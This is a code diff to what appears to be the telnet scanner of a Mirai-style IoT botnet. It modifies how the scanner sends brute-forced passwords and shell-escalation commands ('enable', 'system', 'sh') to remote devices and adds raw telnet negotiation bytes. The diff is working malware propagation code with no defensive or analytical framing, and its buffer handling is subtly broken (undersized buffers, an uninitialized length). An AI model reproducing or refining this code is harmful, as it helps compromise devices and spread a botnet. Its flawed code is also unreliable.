@@ -357,7 +357,6 @@ void scanner_init(void)
 
         for (i = 0; i < SCANNER_MAX_CONNS; i++)
         {
-            int attempt = 0;
             conn = &conn_table[i];
 
             if (conn->fd == -1)
@@ -477,20 +476,25 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d received password prompt\n", conn->fd);
 #endif
-
+                                char password[conn->auth->password_len];
+                                strcpy(password, conn->auth->password);
+                                strcat(password, "\r\n");
                                 // Send password
-                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                                // send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
+                                // send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                                send(conn->fd, password, conn->auth->password_len+2, MSG_NOSIGNAL);
+                                sleep(1);
+                                char tmp1[] = {0xff, 0xfe, 0x01};
+                                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
 
                                 conn->state = SC_WAITING_PASSWD_RESP;
                             }
                             break;
                         case SC_WAITING_PASSWD_RESP:
-                            while (attempt < 10 || (consumed = consume_any_prompt(conn)) > 0)
+                            if ((consumed = consume_any_prompt(conn)) > 0)
                             {
-                                attempt++;
-                                char *tmp_str;
                                 int tmp_len;
+                                char *tmp_str, tmp_str_modified[tmp_len+2];
 
 #ifdef DEBUG
                                 printf("[scanner] FD%d received shell prompt\n", conn->fd);
@@ -499,11 +503,18 @@ void scanner_init(void)
                                 // Send enable / system / shell / sh to session to drop into shell if needed
                                 table_unlock_val(TABLE_SCAN_ENABLE);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                                strcpy(tmp_str_modified, tmp_str);
+                                strcat(tmp_str_modified, "\r\n");
+                                // send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+                                // send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+                                send(conn->fd, tmp_str_modified, tmp_len+2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_ENABLE);
                                 conn->state = SC_WAITING_ENABLE_RESP;
                             }
+                            // else
+                            // {
+                            //     sleep(1);
+                            // }
                             break;
                         case SC_WAITING_ENABLE_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
@@ -523,6 +534,10 @@ void scanner_init(void)
 
                                 conn->state = SC_WAITING_SYSTEM_RESP;
                             }
+                            // else {
+                            //     sleep(1);
+                            //     printf("[scanner] FD%d retrying state %d\n", conn->fd, conn->state);
+                            // }
                             break;
 			            case SC_WAITING_SYSTEM_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
@@ -810,7 +825,10 @@ static int consume_any_prompt(struct scanner_connection *conn)
 
     uint8_t *ptr = conn->rdbuf;
 
-    if (*ptr == 0xff) return 0;
+    if (*ptr == 0xff) {
+        printf("[scanner] FD%d received a command at state %d\n", conn->fd, conn->state);
+        return 0;
+    } 
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     // for (i = 255; i > 0; i--)
@@ -877,18 +895,18 @@ static int consume_pass_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
-    // uint8_t *ptr = conn->rdbuf;
+    uint8_t *ptr = conn->rdbuf;
 
-    // char tmp1[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x33, 0xff, 0xf0};
-    // char tmp2[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x34, 0xff, 0xf0};
+    char tmp1[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x33, 0xff, 0xf0};
+    char tmp2[] = {0xff, 0xfa, 0x1f, 0x00, 0xcc, 0x00, 0x34, 0xff, 0xf0};
 
-    // sleep(2);
-    // send(conn->fd, &tmp1[0], 9, MSG_NOSIGNAL);
-    // sleep(2);
-    // send(conn->fd, &tmp2[0], 9, MSG_NOSIGNAL);
-    // sleep(2);
+    sleep(2);
+    send(conn->fd, &tmp1[0], 9, MSG_NOSIGNAL);
+    sleep(2);
+    send(conn->fd, &tmp2[0], 9, MSG_NOSIGNAL);
+    sleep(2);
 
-    // ptr += conn->rdbuf_pos;
+    ptr += conn->rdbuf_pos;
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
